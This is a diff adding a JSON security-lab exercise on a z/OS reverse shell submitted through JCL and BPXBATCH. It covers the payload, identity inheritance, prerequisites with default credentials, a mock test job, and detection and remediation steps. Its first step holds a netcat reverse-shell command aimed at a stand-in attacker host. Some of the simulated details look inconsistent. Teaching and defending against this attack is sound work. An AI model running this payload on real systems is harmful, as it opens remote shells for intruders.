@@ -1,0 +1,69 @@
+{
+  "id": "reverse-shell",
+  "title": "Z/OS Reverse Shell via JCL (Metasploit)",
+  "description": "Analyze the reverse_shell_jcl payload. Trace deferred execution, identity binding, and the submission-to-execution gap.",
+  "category": "security",
+  "difficulty": "advanced",
+  "steps": [
+    {
+      "title": "The Metasploit JCL Payload",
+      "screen": "Metasploit Module: auxiliary/scanner/tn3270/ibm_util_enum\nPayload: reverse_shell_jcl\n\n//RSHELL   JOB (ACCT),'SHELL',CLASS=A,MSGCLASS=X,\n//         NOTIFY=&SYSUID\n//STEP1    EXEC PGM=BPXBATCH\n//STDOUT   DD SYSOUT=*\n//STDERR   DD SYSOUT=*\n//STDPARM  DD *\nSH nc -e /bin/sh ATTACKER_IP 4444\n/*",
+      "expected": "Understand the structure of the JCL reverse shell payload.",
+      "hint": "BPXBATCH executes Unix System Services (USS) shell commands from batch JCL."
+    },
+    {
+      "title": "Why BPXBATCH?",
+      "screen": "BPXBATCH — Batch Unix System Services\n\nBPXBATCH is an IBM-supplied program that:\n- Runs USS shell commands from batch JCL\n- Bridges the MVS batch world and USS\n- Inherits the submitting user's RACF identity\n- Has access to both MVS datasets AND Unix files\n\nThis makes it the ideal pivot point:\nMVS batch -> USS shell -> network socket",
+      "expected": "BPXBATCH bridges MVS batch execution to Unix shell commands.",
+      "hint": "Any user with RACF BPX.DAEMON or BPX.SERVER authority can run arbitrary USS commands."
+    },
+    {
+      "title": "Identity Binding Analysis",
+      "screen": "Identity Binding in the JCL Payload\n\n1. JOB card: identity bound at submission\n   //RSHELL JOB ... submitted by HERC01\n\n2. JES scheduling: job queued under HERC01\n\n3. BPXBATCH execution: runs as HERC01 in USS\n\n4. nc (netcat): spawns shell as HERC01\n\n5. Reverse connection: attacker gets shell\n   with HERC01's RACF authority\n\nThe identity never changes — it's inherited.",
+      "expected": "Trace how HERC01's identity flows from JCL submission to reverse shell.",
+      "hint": "This is the mainframe equivalent of a cron job reverse shell — deferred and identity-bound."
+    },
+    {
+      "title": "The Submission-to-Execution Gap",
+      "screen": "Submission-to-Execution Gap\n\nT=0:  Attacker submits JCL via TN3270\nT=1:  JES accepts job, assigns JOB00999\nT=2:  Job waits in INPUT queue\nT=3:  Initiator picks up job (CLASS=A)\nT=4:  BPXBATCH starts, nc executes\nT=5:  Reverse shell connects to attacker\n\nGap between T=0 and T=5: seconds to minutes\nDepends on: initiator availability, job class\n\nDetection window: SMF type 30 records at T=1",
+      "expected": "Map the timeline from JCL submission to reverse shell execution.",
+      "hint": "The gap is the detection window — SMF logging at T=1 is the earliest detection point."
+    },
+    {
+      "title": "Prerequisites on TK5",
+      "screen": "Requirements for JCL Reverse Shell on TK5\n\n1. TN3270 access (port 3270)\n2. Valid RACF credentials (HERC01/CUL8TR)\n3. RACF BPX.DAEMON or USS access permitted\n4. netcat (nc) available in USS /bin\n5. Outbound network from Hercules host\n6. Listener on attacker machine\n\nTK5 check:\n- USS is available (OMVS segment in RACF)\n- nc may not be installed by default",
+      "expected": "Identify prerequisites for executing the reverse shell on TK5.",
+      "hint": "Check USS availability: TSO OMVS — if it opens a shell, USS is enabled for your user."
+    },
+    {
+      "title": "Detection and Defense",
+      "screen": "Detection Opportunities\n\n1. SMF Type 30: Job submission record\n   - Captures jobname, userid, submission time\n   - Available in real-time via SMF exit\n\n2. RACF Event Logging: BPX.DAEMON usage\n   - SETROPTS LOGOPTIONS(ALWAYS) for BPX class\n\n3. Network monitoring: outbound from Hercules\n   - Unusual outbound connections from z/OS\n\n4. JES job class monitoring:\n   - Suspicious jobnames or unusual CLASS usage\n\nDefense: Restrict BPX.DAEMON, monitor SMF 30.",
+      "expected": "Identify detection and defense mechanisms against JCL reverse shells.",
+      "hint": "SMF type 30 is the primary audit record — ensure it's being collected and analyzed."
+    },
+    {
+      "title": "Simulate the Attack",
+      "screen": "Simulation (no outbound required)\n\n//TESTUSS  JOB (ACCT),'USS TEST',CLASS=A,MSGCLASS=X\n//STEP1    EXEC PGM=BPXBATCH\n//STDOUT   DD SYSOUT=*\n//STDERR   DD SYSOUT=*\n//STDPARM  DD *\nSH id && uname -a && ls /\n/*\n\nSubmit this JCL to verify USS access.\nOutput shows: uid, system info, root directory.\nIf it works, the reverse shell path is open.",
+      "expected": "Verify USS access via BPXBATCH without requiring a network listener.",
+      "hint": "Replace 'nc -e /bin/sh IP PORT' with 'id' to test without a listener."
+    },
+    {
+      "title": "View USS Output",
+      "screen": "SDSF OUTPUT — TESTUSS JOB00301\n\nuid=0(HERC01) gid=0(SYS1)\nMVS 03.08.00 ADCD.Z23B.PARMLIB 2024\n/\n  bin\n  dev\n  etc\n  tmp\n  usr\n  var\n\nIEF142I TESTUSS STEP1 - STEP WAS EXECUTED - COND CODE 0000",
+      "expected": "USS is accessible and HERC01 runs as uid=0 (root equivalent).",
+      "hint": "uid=0 in USS = superuser. HERC01 has full USS access — the reverse shell would have root."
+    },
+    {
+      "title": "Lab Complete",
+      "screen": "Z/OS Reverse Shell Lab Complete\n\nKey findings:\n- BPXBATCH bridges MVS batch to USS shell\n- Identity is inherited from JCL submitter\n- Deferred execution = detection gap\n- HERC01 = uid=0 in USS (full access)\n- SMF type 30 = primary detection record\n\nAttack chain:\nTN3270 access -> valid creds -> submit JCL\n-> BPXBATCH -> USS shell -> reverse connect\n\nThis is a documented, weaponized attack path.",
+      "expected": "Understand the complete JCL reverse shell attack chain on z/OS.",
+      "hint": "This attack requires only TN3270 access and valid credentials — no exploits needed."
+    },
+    {
+      "title": "Remediation",
+      "screen": "Remediation Steps\n\n1. Restrict BPX.DAEMON:\n   PERMIT BPX.DAEMON CLASS(FACILITY) ID(*) ACCESS(NONE)\n   Only grant to specific service accounts.\n\n2. Enable RACF logging for BPX class:\n   SETROPTS LOGOPTIONS(ALWAYS) CLASSACT(FACILITY)\n\n3. Monitor SMF type 30 records in real-time\n\n4. Restrict outbound network from z/OS LPAR\n\n5. Audit RACF OMVS segments:\n   LU * OMVS — list all users with USS access\n\n6. Consider RACF program control for BPXBATCH",
+      "expected": "Apply remediation to prevent JCL reverse shell attacks.",
+      "hint": "The most effective control is restricting BPX.DAEMON — most users don't need USS access."
+    }
+  ]
+}
